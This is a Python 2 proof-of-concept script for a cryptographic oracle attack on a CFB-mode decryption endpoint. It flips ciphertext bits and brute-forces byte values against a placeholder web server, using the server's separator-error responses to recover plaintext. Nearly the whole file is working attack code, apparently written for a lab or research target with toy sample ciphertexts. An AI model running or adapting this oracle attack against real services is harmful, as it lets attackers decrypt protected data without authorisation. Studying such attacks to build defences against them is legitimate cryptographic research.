#!/usr/bin/python

from base64 import *
from httplib import HTTPConnection

oracle_server = HTTPConnection('YOURWEBSERVER.COM:9999')

class ExceptionType:
	NORMAL = 1
	SEPERATOR = 2
	OTHEREXCEPTION = 3

def isascii(x):
	if type(x) == 'str':
		x = ord(x)
	return x >= int('20', 16) and x <= int('7E', 16)
def arrayToStr(a):
	str = ""
	for x in a:
		str += chr(x)
	return str
def printBytes(s):
	if type(s) == 'bytearray':
		s = str(s)
	str = ""
	for c in s:
		str += '%02X ' % c
	return str
def getExceptionType(ciphertext, verbosity=0):
	ciphertext = b64encode(str(ciphertext))
	ciphertext = ciphertext.replace('/', '%2F').replace('+', '%2B')
	oracle_server.request("GET", '/cfb/decrypt/' + ciphertext)
	response = oracle_server.getresponse()
	data = response.read()
	if 'Invalid Code' in data:
		return (ExceptionType.SEPERATOR, data)
	elif 'Successful' in data:
		return (ExceptionType.NORMAL, data)
	else:
		return (ExceptionType.OTHEREXCEPTION, data)
def printExceptionType(type):
	if type == ExceptionType.SEPERATOR:
		return "Seperator Exception"
	elif type == ExceptionType.NORMAL:
		return "Normal    Operation"
	else:
		return "Other     Exception"
		
def findSeperators(valid_ciphertext, verbosity=0):
	if type(valid_ciphertext) != bytearray:
		valid_ciphertext = bytearray(valid_ciphertext)
	bytes = len(valid_ciphertext)
	
	seperator_vector = range(bytes)
	result_vector = range(bytes)
	#Flip the LSB in each byte, see the outcome
	for i in range(bytes):
		ciphertext = valid_ciphertext[:] #Without the [:] it's copy by reference
		ciphertext[i] ^= 1
		answer, response = getExceptionType(ciphertext, verbosity)
		
		if answer == ExceptionType.SEPERATOR:
			#Double Check...
			ciphertext = valid_ciphertext[:] #Without the [:] it's copy by reference
			ciphertext[i] ^= 2
			answer, response = getExceptionType(ciphertext, 0)
			result_vector[i] = answer
			if answer == ExceptionType.SEPERATOR:
				seperator_vector[i] = 1
			else:
				seperator_vector[i] = 0
				#Byte is not a seperator, but is 1 bit removed from a seperator.
				#Flipping the LSBit made it a seperator
		else:
			seperator_vector[i] = 0
		
		if verbosity > 0: print "[1]", "Byte Position", i
		if verbosity > 1: print "\t[2]", "Orig:", printBytes(valid_ciphertext), "XOR:", printBytes(ciphertext)
		if verbosity > 1: print "\t[2]", "Server Response:", response
		if verbosity > 0: print "\t[1]", printExceptionType(answer)
		if verbosity > 0: print ""

	if sum(seperator_vector) == 1:
		seperatorIndex = seperator_vector.index(1)
		print "[+] Found seperator at index", seperatorIndex
		return seperator_vector
	else:
		print "[+] Found multiple seperators at indexes", [i for i in range(bytes) if seperator_vector[i] == 1]
		return seperator_vector
		
		
def decrypt(valid_ciphertext, seperator_vector, verbosity=0):	
	if type(valid_ciphertext) != bytearray:
		valid_ciphertext = bytearray(valid_ciphertext)
	bytes = len(valid_ciphertext)
	
	#This is the ciphertext with the seperator xored out
	# Sending this will generator a SeperatorException, because the number of seperators is invalid.
	ciphertext_onelessseperator = valid_ciphertext
	ciphertext_onelessseperator[seperator_vector.index(1)] ^= 1
	
	#This will store the values that produce a seperator when submitted in that position
	found_values = []
	
	print "[+] Finding Intermediate Values..."
	
	#Decrypt each byte...
	for i in range(bytes):
		# Do not try to find value of seperator
		if seperator_vector[i] == 1:
			found_values.append([0])
			continue 
		
		#If there's base64 padding, we'll get a range of SeperatorExceptions in a row.
		#  This variable tracks how many we've seen, so we can throw away four in a row
		#  but focus on the individual one we see by its lonesome.
		nonSeperatorExceptionsInARow = 0
		
		foundValue = 0 #This will hold the intermediate value
		
		b = 0
		while b < 256:
			ciphertext = ciphertext_onelessseperator[:] #Without the [:] it's copy by reference
			ciphertext[i] = b
			answer, response = getExceptionType(ciphertext, verbosity)
			
			if verbosity > 1: print "[2]", i, ":", str(b).rjust(3, " "), 
			if verbosity > 1: print "[2]", printExceptionType(answer)

			if answer != ExceptionType.SEPERATOR:
				nonSeperatorExceptionsInARow += 1
			else:
				if nonSeperatorExceptionsInARow == 1:
					foundValue = b-1
					b = 500
				elif nonSeperatorExceptionsInARow > 1:
					nonSeperatorExceptionsInARow = 0
			b += 1
			
		if foundValue == 0:
			raise Exception("Could not find a Seperator Exception for any value of Position " + str(i))
			
		print "[+] Position", i, "has value", foundValue
		found_values.append(foundValue)

	print "[+] Beginning Decryption..."
		
	#Now try various seperators to guess which it might be.
	for sep in ["|"]:
		#Store the values we used (in case we don't use the first/only)
		used_values = []
		#Now build up an array of values in the plaintext.  
		decrypted_block = []
		
		for i in range(bytes):
			if seperator_vector[i] == 1:
				used_values.append(0)
				decrypted_block.append(ord(sep))
			else:
				used_values.append(found_values[i])
				decrypted_block.append(found_values[i] ^ valid_ciphertext[i] ^ ord(sep))
	
		if verbosity > 0: print "[1] Seperator:", sep
		if verbosity > 0: print "[1] \tUsed Intermediate Values:", used_values
		if verbosity > 0: print "[1] \tAfter XOR:               ", decrypted_block
		print "[+] Decrypted:", arrayToStr(decrypted_block)
			
#Segment Size of 16, one block
#aaa|bbbcccdddeee
valid_ciphertext = bytearray(b64decode("xbQ0iHjqZ7ueq/Ov+tJgew=="))
#aaa|bbbcc|dddeee
valid_ciphertext = bytearray(b64decode("xbQ0iHjqZ7uetPOv+tJgew=="))
	
seperator_vector = findSeperators(valid_ciphertext, 0)
decrypt(valid_ciphertext, seperator_vector, 0)